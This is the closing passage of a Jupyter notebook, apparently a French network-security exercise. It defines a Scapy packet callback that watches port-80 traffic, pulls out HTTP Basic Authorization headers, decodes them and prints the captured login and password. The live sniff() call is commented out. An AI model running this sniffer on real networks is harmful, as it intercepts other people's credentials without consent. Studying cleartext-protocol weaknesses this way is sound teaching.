   "metadata": {},
   "outputs": [],
   "source": [
    "def http_sniffer(pkt):\n",
    "    if pkt.haslayer(TCP) and pkt.haslayer(Raw):\n",
    "        tcp_layer = pkt[TCP]\n",
    "        if tcp_layer.dport == 80 or tcp_layer.sport == 80:\n",
    "            try:\n",
    "                payload = pkt[Raw].load.decode('utf-8', errors='ignore')\n",
    "            except:\n",
    "                return\n",
    "            for line in payload.split('\\r\\n'):\n",
    "                if line.lower().startswith('authorization: basic '):\n",
    "                    b64_credentials = line.split(' ', 2)[2]\n",
    "                    try:\n",
    "                        decoded_bytes = base64.b64decode(b64_credentials)\n",
    "                        decoded_str = decoded_bytes.decode('utf-8', errors='ignore')\n",
    "                        if ':' in decoded_str:\n",
    "                            login, password = decoded_str.split(':', 1)\n",
    "                            print(f\"Login : {login}\")\n",
    "                            print(f\"Mot de passe : {password}\")\n",
    "                    except Exception as e:\n",
    "                        print(f\"Erreur décodage : {e}\")\n",
    "\n",
    "print(\"Démarrage du sniffer HTTP ...\")\n",
    "# sniff(filter=\"tcp port 80\", prn=http_sniffer, store=False)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2777a95a",
   "metadata": {},
   "source": [
    "Voilà pour le **HTTP**"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
